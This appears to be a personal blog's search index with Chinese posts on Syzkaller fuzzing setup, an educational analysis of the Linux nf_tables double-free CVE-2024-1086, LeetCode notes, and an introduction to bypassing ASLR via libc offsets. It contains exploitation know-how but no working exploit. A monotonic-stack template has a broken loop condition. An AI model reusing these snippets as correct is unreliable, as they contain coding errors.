<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>前言</title>
    <url>/2024/03/07/hello-world/</url>
    <content><![CDATA[<p>记录、积累、反思、回顾</p>
<p>May this blog help you.</p>
<p>欢迎交流：<a href="mailto:&#121;&#x79;&#x7a;&#x68;&#x75;&#x2e;&#114;&#x79;&#97;&#x6e;&#64;&#x67;&#109;&#x61;&#105;&#108;&#46;&#x63;&#x6f;&#109;">&#121;&#x79;&#x7a;&#x68;&#x75;&#x2e;&#114;&#x79;&#97;&#x6e;&#64;&#x67;&#109;&#x61;&#105;&#108;&#46;&#x63;&#x6f;&#109;</a></p>
]]></content>
  </entry>
  <entry>
    <title>Syzkaller使用笔记</title>
    <url>/2024/04/12/syzkaller1/</url>
    <content><![CDATA[<h1 id="Syzkaller使用笔记"><a href="#Syzkaller使用笔记" class="headerlink" title="Syzkaller使用笔记"></a>Syzkaller使用笔记</h1><h2 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1. 环境配置"></a>1. 环境配置</h2><h3 id="1-1-环境依赖"><a href="#1-1-环境依赖" class="headerlink" title="1.1 环境依赖"></a>1.1 环境依赖</h3><ul>
<li>gcc make clang</li>
<li>go (<a href="https://go.dev/dl/">https://go.dev/dl/</a> 最新syzkaller要求1.20以上的go版本，但是1.22的go又跑出来空指针导致panic了，所以直接用1.20的就可以)</li>
<li>syzkaller(<a href="https://github.com/google/syzkaller.git">https://github.com/google/syzkaller.git</a>)</li>
<li>kasan内核 （可以通过源码开启config配置项编译）</li>
</ul>
<h3 id="1-2-工作目录"><a href="#1-2-工作目录" class="headerlink" title="1.2 工作目录"></a>1.2 工作目录</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /root/workdir/kasan</span><br></pre></td></tr></table></figure>



<h2 id="2-定制化建模（如果不自己建模可以跳过这一部分）"><a href="#2-定制化建模（如果不自己建模可以跳过这一部分）" class="headerlink" title="2. 定制化建模（如果不自己建模可以跳过这一部分）"></a>2. 定制化建模（如果不自己建模可以跳过这一部分）</h2><ul>
<li>环境配置好后，进入syzkaller目录，先编译生成syz-extract</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /root/syzkaller</span><br><span class="line">make bin/syz-extract</span><br></pre></td></tr></table></figure>

<ul>
<li><p>将自己建模的**.txt<strong>文件和</strong>.h**文件放入 syzkaller&#x2F;sys&#x2F;linux&#x2F; 目录下</p>
</li>
<li><p>通过syz-extract从**.txt**文件中提取出常量，这一步需要用到内核源码</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bin/syz-extract -sourcedir /root/kernel-source a.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>访问**.const**常量文件，没有???则代表建模成功</li>
</ul>
<h2 id="3-编译syzkaller"><a href="#3-编译syzkaller" class="headerlink" title="3. 编译syzkaller"></a>3. 编译syzkaller</h2><p>编译syzkaller，生成syz-manager等二进制。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make clean </span><br><span class="line">make generate</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>编译成功的同时也会在bin&#x2F;linux-amd64目录下生成 syz-extractor等二进制文件，需要将这些二进制文件传到对端。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp bin/linux-*/* root@remoteIP:/root/</span><br></pre></td></tr></table></figure>



<h2 id="4-哈哈哈哈哈我疯了"><a href="#4-哈哈哈哈哈我疯了" class="headerlink" title="4. 哈哈哈哈哈我疯了"></a>4. 哈哈哈哈哈我疯了</h2>]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>安全工具</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞分析-CVE-2024-1086</title>
    <url>/2024/04/07/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2024-1086/</url>
    <content><![CDATA[<h1 id="CVE-2024-1086-Double-Free-in-nf-tables"><a href="#CVE-2024-1086-Double-Free-in-nf-tables" class="headerlink" title="CVE-2024-1086 Double Free in nf_tables"></a>CVE-2024-1086 Double Free in nf_tables</h1><p>这个漏洞的根因其实还是非常容易理解的——主要是内核代码里没有校验参数，导致用户可以利用。但是通读了原作者的分析文章，发现作者详细描述了其发现漏洞的思路，这对我们做内核的测试和漏洞挖掘都有一些较深启示。此外，作者也利用了Dirty pagetable这一较新的漏洞利用方法，值得一探究竟。</p>
<p>探究过内核的人都知道内核的代码量之大，架构之复杂是令人惊叹的。因此本文也会对与本漏洞相关的内核概念做一些介绍，而那些在网上可以直接搜到的非技术类信息，本文则不多赘述。</p>
<p>作者的原文在这里，感兴趣的可以自行阅读：<a href="https://pwning.tech/nftables/#3-the-bug%E3%80%82">https://pwning.tech/nftables/#3-the-bug。</a></p>
<h2 id="1-漏洞发现"><a href="#1-漏洞发现" class="headerlink" title="1. 漏洞发现"></a>1. 漏洞发现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It all started when I wanted to implement firewall bypasses into my ORB rootkit Netkit. I wanted to rely on the kernel API (exported functions) for any actions, as it would have the same compatibility as regular kernel modules. Hopefully, this would mean that the rootkit kernel module could be used across architectures and kernel versions, without having to change the source code.</span><br><span class="line">...</span><br><span class="line">While reading nf_tables code - whose state machine is very interesting from a software development point of view - I noticed the nf_hook_slow() function. This function loops over all rules in a chain and stops evaluation (returns the function) immediately when NF_DROP is issued.</span><br></pre></td></tr></table></figure>

<p>作者是为了实现其工具，用到了netfilter相关的技术，才开始研究的这块技术。而此前作者和我们一样，也对此领域一无所知。当作者通读了源码之后发现了这个<em>nf_hook_slow()<em>这个函数会循环遍历每一条存在的规则。而在</em>NF_DROP</em>条件下，其返回值<em>ret</em>是取决于<em>verdict</em>的，而通过进一步对<em>verdict</em>的分析，作者又发现其值是可以被用户控制的。因此作者就抱着试一试的心态，将<em>NF_DROP</em>下的返回值<em>ret</em>设置为<em>NF_ACCEPT</em>，看看内核是否会发生什么异常。结果，作者发现了一堆panic的错误，经过分析，发现了double-free的问题。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// looping over existing rules when skb triggers chain</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">nf_hook_slow</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb, <span class="keyword">struct</span> nf_hook_state *state,</span></span><br><span class="line"><span class="params">		 <span class="type">const</span> <span class="keyword">struct</span> nf_hook_entries *e, <span class="type">unsigned</span> <span class="type">int</span> s)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> verdict;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line">	<span class="keyword">for</span> (; s &lt; e-&gt;num_hook_entries; s++) &#123;</span><br><span class="line">		verdict = nf_hook_entry_hookfn(&amp;e-&gt;hooks[s], skb, state);</span><br><span class="line">		<span class="keyword">switch</span> (verdict &amp; NF_VERDICT_MASK) &#123;</span><br><span class="line">		<span class="keyword">case</span> NF_ACCEPT:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> NF_DROP:</span><br><span class="line">			kfree_skb_reason(skb, SKB_DROP_REASON_NETFILTER_DROP);</span><br><span class="line">			ret = NF_DROP_GETERR(verdict);</span><br><span class="line">			<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">				ret = -EPERM;</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			WARN_ON_ONCE(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个问题的整体发现思路其实是：<strong>1. 作者想实现工具 ——&gt; 2. 学习Netfilter知识 ——&gt; 3. 找到相关内核函数进行分析 ——&gt; 4. 发现可能漏洞点并尝试测试 ——&gt; 5. 系统panic ——&gt; 6. 进一步分析 ——&gt; 7. 发现double free问题 ——&gt; 8. 尝试漏洞利用</strong>。</p>
<p>我自己反思了一下，如果是我做工具的实现，可能卡在第4步就不会继续往下走了——即使发现了可能存在的漏洞点也不会尝试。又或者简单尝试了一下之后发现系统panic，也不去做进一步的分析了。</p>
<p>当然作为测试，我们可能也往往做到第5步就当完成了任务，提单然后交给开发分析解决，不会去想怎么进一步利用。 因为利用更加考察平时对技术的积累和技术熟练度。而作为安全从业人员，其与测试人员的区别往往就在于是否具备后者的能力。</p>
<h2 id="2-背景知识"><a href="#2-背景知识" class="headerlink" title="2. 背景知识"></a>2. 背景知识</h2><h3 id="2-1-sk-buff-skb"><a href="#2-1-sk-buff-skb" class="headerlink" title="2.1 sk_buff (skb)"></a>2.1 sk_buff (skb)</h3><p>描述网络数据的，包含IP包信息，WiFi帧等，结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                ---------------</span><br><span class="line">                               | sk_buff       |</span><br><span class="line">                                ---------------</span><br><span class="line">   ,---------------------------  + head</span><br><span class="line">  /          ,-----------------  + data</span><br><span class="line"> /          /      ,-----------  + tail</span><br><span class="line">|          |      |            , + end</span><br><span class="line">|          |      |           |</span><br><span class="line">v          v      v           v</span><br><span class="line"> -----------------------------------------------</span><br><span class="line">| headroom | data |  tailroom | skb_shared_info |</span><br><span class="line"> -----------------------------------------------</span><br><span class="line">                               + [page frag]</span><br><span class="line">                               + [page frag]</span><br><span class="line">                               + [page frag]</span><br><span class="line">                               + [page frag]       ---------</span><br><span class="line">                               + frag_list    --&gt; | sk_buff |</span><br><span class="line">                                                   ---------</span><br></pre></td></tr></table></figure>

<p>从上面可以看到，sk_buff.head指向的区域，主要包含了data和skb_share_info两块内容，skb_share_info也可能指向另一个sk_buff。</p>
<p>参考Linux官方文档：<a href="https://docs.kernel.org/networking/skbuff.html">https://docs.kernel.org/networking/skbuff.html</a></p>
<h3 id="2-2-内存分配"><a href="#2-2-内存分配" class="headerlink" title="2.2 内存分配"></a>2.2 内存分配</h3><p>内存主要有三种分配方式：</p>
<ul>
<li>Buddy分配：最大的内存分配器，以页为单位管理内存。</li>
<li>PCP分配：Linux中每个zone都有一个Per-CPU Cache的机制，每个cache中缓存一些单个page，挂载在每一个CPU的链表中，当需要单个page的时候就直接从cache中分配。 PCP分配存在的原因是：当一个CPU从Buddy申请内存的时候，Buddy分配器会锁定访问权限，这样当另一个CPU申请内存的时候，就会阻塞。PCP的存在就是缓解了这种阻塞情况。</li>
<li>SLAB分配：还是从Buddy中获取内存，但是以字节为单位分配小内存。</li>
</ul>
<h3 id="2-3-TLB"><a href="#2-3-TLB" class="headerlink" title="2.3 TLB"></a>2.3 TLB</h3><p>转换后备缓冲区（TLB），缓存了虚拟地址与物理地址之间的映射关系，使得CPU不必再遍历页表，而是可以先查看TLB。</p>
<p>TLB的刷新是要通过某些函数来调用的，但是有一些意向不到的操作更改了页表，或者页表中的虚拟地址，这时由于这些刷新函数没有被调用到，因此页表不会刷新。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记9 - 位运算</title>
    <url>/2024/04/04/leetcode-xor/</url>
    <content><![CDATA[<h1 id="Leetcode笔记9-位运算"><a href="#Leetcode笔记9-位运算" class="headerlink" title="Leetcode笔记9 - 位运算"></a>Leetcode笔记9 - 位运算</h1><p><strong>核心知识点：</strong></p>
<ul>
<li>任何数和0做异或运算，都为原来的数</li>
<li>任何数和自己做异或运算，都为0</li>
<li>异或运算满足结合律和交换律</li>
</ul>
<h2 id="136-只出现一次的数字"><a href="#136-只出现一次的数字" class="headerlink" title="136. 只出现一次的数字"></a><a href="https://leetcode.cn/problems/single-number/">136. 只出现一次的数字</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给你一个 非空 整数数组 nums ，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</span></span><br><span class="line"><span class="comment"># 你必须设计并实现线性时间复杂度的算法来解决此问题，且该算法只使用常量额外空间。</span></span><br><span class="line"><span class="comment"># 输入：nums = [2,2,1]</span></span><br><span class="line"><span class="comment"># 输出：1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">singleNumber</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        ans = nums[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(nums)):</span><br><span class="line">            ans = ans ^ nums[i]</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记8 - 二维动态规划总结</title>
    <url>/2024/03/31/leetcode-dp2/</url>
    <content><![CDATA[<h1 id="Leetcode笔记8-二维动态规划"><a href="#Leetcode笔记8-二维动态规划" class="headerlink" title="Leetcode笔记8 - 二维动态规划"></a>Leetcode笔记8 - 二维动态规划</h1><p><strong>核心思路</strong></p>
<ul>
<li>确定状态，即问题的变量</li>
<li>确定dp方程 —— 需要考虑dp[0][0], dp[i][0], dp[0][j] 的所有情况 </li>
<li>采用自底向上 &#x2F; 自顶向下的解法</li>
</ul>
<h2 id="64-最小路径和"><a href="#64-最小路径和" class="headerlink" title="64. 最小路径和"></a><a href="https://leetcode.cn/problems/minimum-path-sum/">64. 最小路径和</a></h2><p>第一步先将dp[0][0], dp[i][0], dp[0][j] 确定，然后下面自然开始考虑dp[1][1]的情况。很显然，**dp[1][1] &#x3D; min( dp[0][1] , dp[1][0] ) + grid[1][1]**。</p>
<p><img src="https://assets.leetcode-cn.com/solution-static/64/9.png"></p>
<p>对于任意的dp[i][j]，我们发现，由于<strong>只有两个方向能到达</strong>，因此**dp[i][j] &#x3D; min(dp[i-1][j], dp[i][j-1]) + grid[i][j] **。</p>
<p><img src="https://assets.leetcode-cn.com/solution-static/64/17.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给定一个包含非负整数的 m x n 网格 grid ，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。</span></span><br><span class="line"><span class="comment">## dp[i][0] = dp[i-1][0] + grid[i][0]</span></span><br><span class="line"><span class="comment">## dp[0][j] = dp[0][j-1] + grid[0][j-1]</span></span><br><span class="line"><span class="comment">## dp[i][j] = min(dp[i-1][j], dp[i][j-1]) + grid[i][j]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minPathSum</span>(<span class="params">self, grid: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> grid <span class="keyword">or</span> <span class="keyword">not</span> grid[<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        rows, cols = <span class="built_in">len</span>(grid), <span class="built_in">len</span>(grid[<span class="number">0</span>])</span><br><span class="line">        dp = [[<span class="number">0</span>] * cols <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rows)]</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = grid[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, rows):</span><br><span class="line">            dp[i][<span class="number">0</span>] = dp[i-<span class="number">1</span>][<span class="number">0</span>] + grid[i][<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, cols):</span><br><span class="line">            dp[<span class="number">0</span>][j] = dp[<span class="number">0</span>][j-<span class="number">1</span>] + grid[<span class="number">0</span>][j]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, rows):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, cols):</span><br><span class="line">                dp[i][j] = <span class="built_in">min</span>(dp[i-<span class="number">1</span>][j], dp[i][j-<span class="number">1</span>]) + grid[i][j]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dp[rows-<span class="number">1</span>][cols-<span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="62-不同路径"><a href="#62-不同路径" class="headerlink" title="62. 不同路径"></a><a href="https://leetcode.cn/problems/unique-paths/">62. 不同路径</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为 “Start” ）。</span></span><br><span class="line"><span class="comment"># 机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为 “Finish” ）。</span></span><br><span class="line"><span class="comment"># 问总共有多少条不同的路径？</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dp[i][0] = 1</span></span><br><span class="line"><span class="comment"># dp[0][j] = 1</span></span><br><span class="line"><span class="comment"># dp[i][j] = dp[i-1][j] + dp[i][j-1]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dp[1][0] = 1</span></span><br><span class="line"><span class="comment"># dp[0][1] = 1</span></span><br><span class="line"><span class="comment"># dp[1][1] = dp[1][0] + dp[0][1] = 1 + 1 = 2</span></span><br><span class="line"><span class="comment"># dp[1][2] = dp[1][1] + dp[0][2] = 2 + 1 = 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">uniquePaths</span>(<span class="params">self, m: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        dp = [[<span class="number">0</span>] * n] * m</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            dp[<span class="number">0</span>][j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, m):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">                dp[i][j] = dp[i][j-<span class="number">1</span>] + dp[i-<span class="number">1</span>][j]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dp[m-<span class="number">1</span>][n-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记7 - 栈结构总结</title>
    <url>/2024/03/22/leetcode-stack/</url>
    <content><![CDATA[<h1 id="Leetcode笔记7-栈结构总结"><a href="#Leetcode笔记7-栈结构总结" class="headerlink" title="Leetcode笔记7 - 栈结构总结"></a>Leetcode笔记7 - 栈结构总结</h1><p>栈的特点是：先进后出，后进先出。</p>
<p>遇到需要先进后出的题，优先考虑栈结构。例如：匹配括号等。</p>
<h2 id="1-辅助栈"><a href="#1-辅助栈" class="headerlink" title="1. 辅助栈"></a>1. 辅助栈</h2><h3 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20. 有效的括号"></a><a href="https://leetcode.cn/problems/valid-parentheses/">20. 有效的括号</a></h3><p>这里需要考虑合法括号的特点是啥：</p>
<p>例如 () [] {}都是合法括号， (())也是合法括号，但是如果认为左括号和右括号数量相等就为合法括号，是错误的，因为：(([))]也不合法</p>
<p>(([))] 不合法的原因是： [的右边跟上了一个右小括号），但是如果[的右边跟上的是一个左小括号(，那么括号可能是合法的，因为：(([()]))</p>
<p>所以合法括号的特点是：</p>
<ul>
<li>左右括号数量相等</li>
<li>左括号的右边不能紧跟着非同类的右括号</li>
</ul>
<p>但是这样考虑太复杂了，我们需要换个角度考虑，从括号闭合的角度思考：<strong>当括号内部没有子括号，或者括号内部的子括号全部闭合时，我们认为括号合法</strong>。</p>
<p>因此，<strong>最里面的括号需要先闭合</strong> —— 可是一个数组里，我们往往是按顺序遍历数组的，如果最里面的括号需要闭合，意味着我们需要考虑栈，因为栈是先进后出，后进先出的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：s = &quot;()&quot;</span></span><br><span class="line"><span class="comment"># 输出：true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入：s = &quot;(]&quot;</span></span><br><span class="line"><span class="comment"># 输出：false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isValid</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="comment">## ([&#123;&#125;()])</span></span><br><span class="line">        stack = [<span class="string">&#x27;?&#x27;</span>]</span><br><span class="line">        hashmap = &#123;<span class="string">&#x27;(&#x27;</span>:<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>:<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>:<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;?&#x27;</span>:<span class="string">&#x27;?&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> hashmap: stack.append(c)</span><br><span class="line">            <span class="keyword">elif</span> c != hashmap[stack.pop()]: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="built_in">len</span>(stack) == <span class="number">1</span> <span class="keyword">else</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>



<h2 id="2-单调栈"><a href="#2-单调栈" class="headerlink" title="2. 单调栈"></a>2. 单调栈</h2><p>单调栈是用来解决“<strong>下一个更大</strong>”类型的题目。</p>
<p>一个数组，要求你找到每个元素对应的下一个更大的元素。</p>
<p><strong>核心思路：</strong></p>
<ul>
<li>思考这样一个数组[5,4,1,2,3,4,5,6]，从后往前思考，nums[1]&#x3D;4的下一个更大元素是nums[6]&#x3D;5，而nums[0]&#x3D;5的下一个最大元素是nums[7]&#x3D;6</li>
<li>实际上在考虑nums[1] 的下一个最大元素为nums[6]的时候，nums[1]已经和nums[2], nums[3], num[4], nums[5]做过比较了 —— nums[1] 比它们都大</li>
<li>因此继续考虑nums[0]的时候，nums[2], nums[3], nums[4], nums[5]都不必再考虑了，只需比较它和nums[1]，由于nums[0] &gt; nums[1]，因此下一个直接比较nums[0]和nums[6]就好了，栈里的其他元素都要pop掉。</li>
</ul>
<p><strong>模板：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数组： nums = [4,1,2,3,4,5]</span></span><br><span class="line">size = <span class="built_in">len</span>(nums)</span><br><span class="line">stack = []</span><br><span class="line">keep = <span class="built_in">dict</span>&#123;&#125;</span><br><span class="line"><span class="comment"># 从后往前遍历 + 从后往前入栈</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="comment"># 如果栈为空，或者当前的元素比栈顶元素大的话，把栈顶元素pop出来，直到找到不比当前元素大的，或者直到栈为空</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stack <span class="keyword">or</span> nums[i] &gt; stack[-<span class="number">1</span>]:</span><br><span class="line">        stack.pop()</span><br><span class="line">    <span class="comment"># 这个时候记录一下当前元素的下一个最大值</span></span><br><span class="line">    keep[nums[i]] = stack[-<span class="number">1</span>] <span class="keyword">if</span> stack <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">    <span class="comment"># 把数组元素从后往前入栈</span></span><br><span class="line">    stack.append(nums[i])</span><br></pre></td></tr></table></figure>



<h3 id="496-下一个更大元素-I"><a href="#496-下一个更大元素-I" class="headerlink" title="496. 下一个更大元素 I"></a><a href="https://leetcode.cn/problems/next-greater-element-i/">496. 下一个更大元素 I</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums1 = [4,1,2], nums2 = [1,3,4,2].</span></span><br><span class="line"><span class="comment"># 输出：[-1,3,-1]</span></span><br><span class="line"><span class="comment"># 解释：nums1 中每个值的下一个更大元素如下所述：</span></span><br><span class="line"><span class="comment"># - 4 ，用加粗斜体标识，nums2 = [1,3,4,2]。不存在下一个更大元素，所以答案是 -1。</span></span><br><span class="line"><span class="comment"># - 1 ，用加粗斜体标识，nums2 = [1,3,4,2]。下一个更大元素是 3。</span></span><br><span class="line"><span class="comment"># - 2 ，用加粗斜体标识，nums2 = [1,3,4,2]。不存在下一个更大元素，所以答案是 -1。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">nextGreaterElement</span>(<span class="params">self, nums1: <span class="type">List</span>[<span class="built_in">int</span>], nums2: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        stack = []</span><br><span class="line">        keep = &#123;&#125;</span><br><span class="line">        n = <span class="built_in">len</span>(nums2)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">while</span> stack <span class="keyword">and</span> nums2[i] &gt; stack[-<span class="number">1</span>]:</span><br><span class="line">                stack.pop()</span><br><span class="line">            keep[nums2[i]] = stack[-<span class="number">1</span>] <span class="keyword">if</span> stack <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">            stack.append(nums2[i])</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums1:</span><br><span class="line">            res.append(keep[num])</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>缓冲区溢出学习笔记1-ASLR绕过</title>
    <url>/2024/03/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-ASLR%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="二进制保护机制原理和绕过技巧"><a href="#二进制保护机制原理和绕过技巧" class="headerlink" title="二进制保护机制原理和绕过技巧"></a>二进制保护机制原理和绕过技巧</h1><h2 id="0x00-工具"><a href="#0x00-工具" class="headerlink" title="0x00 工具"></a>0x00 工具</h2><ul>
<li><strong>peda</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>readelf</strong></li>
</ul>
<p>readelf的作用是<strong>用来查看当前elf文件的符号表</strong>，符号表中的信息只包括全局变量和函数名。 动态符号表(.synsym)用来保存与动态链接相关的导入导出符号，不包括模块内的符号；而systab表则保存所有的符号，包括.dynsym中的符号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system</span><br></pre></td></tr></table></figure>



<h2 id="0x01-ASLR"><a href="#0x01-ASLR" class="headerlink" title="0x01 ASLR"></a>0x01 ASLR</h2><p>ASLR（地址空间布局随机化）的原理不作详细介绍，它可以将进程内的某些内存地址进行随机化来加大入侵难度。因此我们很难直接通过ret2libc成功利用漏洞。</p>
<p><strong>绕过ASLR核心点</strong> </p>
<ul>
<li>开启ASLR后，libc的<strong>基地址会变</strong>，但是<strong>函数的偏移量不会变</strong></li>
<li>system 函数地址 &#x3D; libc基地址 + 函数偏移量</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/65fc5d2f9f345e8d03706af0.png"></p>
<p><img src="https://pic.imgdb.cn/item/65fc5d309f345e8d03706da2.png"></p>
<h2 id="0x02-return-to-plt技术"><a href="#0x02-return-to-plt技术" class="headerlink" title="0x02 return-to-plt技术"></a>0x02 return-to-plt技术</h2><h3 id="2-1-背景知识"><a href="#2-1-背景知识" class="headerlink" title="2.1 背景知识"></a>2.1 背景知识</h3><p>在介绍这一技术前，先了解一下Linux内存布局、静态函数库和动态函数库（共享函数库）的区别以及PIC。</p>
